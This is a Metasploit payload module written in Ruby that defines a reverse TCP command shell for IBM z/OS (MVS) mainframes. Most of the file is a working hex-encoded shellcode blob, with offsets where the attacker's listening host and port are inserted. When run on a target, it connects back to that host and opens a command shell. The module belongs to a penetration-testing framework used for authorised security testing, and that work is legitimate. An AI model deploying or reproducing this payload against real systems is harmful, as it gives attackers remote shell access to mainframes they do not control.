# frozen_string_literal: true
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# This payload has no ebcdic<->ascii translator built in.
# Therefore it must use a shell which does, like mainframe_shell
#
#
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/mainframe_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule
  CachedSize = 339

  include Msf::Payload::Single
  include Msf::Payload::Mainframe
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
                     'Name'          => 'Z/OS (MVS) Command Shell, Reverse TCP Inline',
                     'Description'   => 'Listen for a connection and spawn a command shell.
                         This implmentation does not include ebcdic character translation,
                         so a client with translation capabilities is required.  MSF handles
                         this automatically.',
                     'Author'        => 'Bigendian Smalls',
                     'License'       => MSF_LICENSE,
                     'Platform'      => 'mainframe',
                     'Arch'          => ARCH_ZARCH,
                     'Handler'       => Msf::Handler::ReverseTcp,
                     'Session'       => Msf::Sessions::MainframeShell,
                     'Payload'       =>
                       {
                         'Offsets' =>
                           {
                             'LPORT' => [ 321, 'n'    ],
                             'LHOST' => [ 323, 'ADDR' ]
                           },
                         'Payload' =>
                           "\x18\x7f\xa5\x76\x1f\xff\x41\x17\x01\x54\xd7\xcb\x10\x00\x10\x00" \
                           "\x41\xd7\x01\xd8\xa7\x88\x00\x08\xa7\x98\x00\x01\xa7\xa8\x00\x02" \
                           "\x41\x07\x01\x1c\x41\x30\x00\x08\x41\x57\x01\x9c\x50\xa7\x01\x9c" \
                           "\x50\x97\x01\xa0\x50\x97\x01\xa8\x41\xf7\x00\xcc\x0d\xef\x58\x57" \
                           "\x01\xac\x50\x57\x01\xbc\x41\x17\x01\x3e\x41\x57\x01\xbc\xd2\x08" \
                           "\x50\x07\x10\x00\x41\x07\x01\x24\x41\x30\x00\x06\x41\x57\x01\xbc" \
                           "\x41\xf7\x00\xcc\x0d\xef\xa7\xb8\x00\x02\xa7\xf4\x00\x1e\xa7\xba" \
                           "\xff\xff\xec\xb7\xff\xfc\xff\x7e\x41\x17\x01\x48\x50\xa7\x01\x80" \
                           "\x41\x27\x01\x80\x50\x20\x10\x10\x41\x27\x01\x3c\x50\x20\x10\x14" \
                           "\x50\x97\x01\x54\x41\x07\x01\x2c\x41\x30\x00\x0d\x41\x57\x01\x48" \
                           "\x41\xf7\x00\xcc\x0d\xef\x41\x07\x01\x34\x50\x87\x01\x88\x58\x57" \
                           "\x01\xac\x50\x57\x01\x84\x50\xb7\x01\x8c\x41\x30\x00\x06\x41\x57" \
                           "\x01\x84\x41\xf7\x00\xcc\x0d\xef\xa7\xf4\xff\xd3\x50\xe0\xd0\x08" \
                           "\x17\x11\x0a\x08\x50\x0d\x00\x0c\x58\xfd\x00\x0c\xa7\x68\x00\x14" \
                           "\x41\x16\xd0\x00\x50\x56\xd0\x00\xa7\x3a\xff\xff\xec\x38\x00\x14" \
                           "\x0b\x7e\xa7\x6a\x00\x04\xa7\x5a\x00\x04\xec\x37\xff\xf5\x00\x7e" \
                           "\x41\x56\xd0\x00\xa7\x5a\xff\xfc\x96\x80\x50\x00\x05\xef\x58\xe0" \
                           "\xd0\x08\x07\xfe\xa7\x5a\x00\x04\xa7\xf4\xff\xed\xc2\xd7\xe7\xf1" \
                           "\xe2\xd6\xc3\x40\xc2\xd7\xe7\xf1\xc3\xd6\xd5\x40\xc2\xd7\xe7\xf1" \
                           "\xc5\xe7\xc3\x40\xc2\xd7\xe7\xf1\xc6\xc3\xe3\x40\xa2\x88\x10\x02" \
                           "\x02\x00\x00\x7f\x00\x00\x01\x00\x00\x00\x00\x07\x61\x82\x89\x95" \
                           "\x61\xa2\x88"
                       }))
  end
end
